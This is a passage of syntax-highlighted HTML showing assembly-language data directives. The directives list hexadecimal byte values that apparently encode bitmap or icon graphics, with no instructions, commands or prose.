    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Fh</span><span class="sc0">
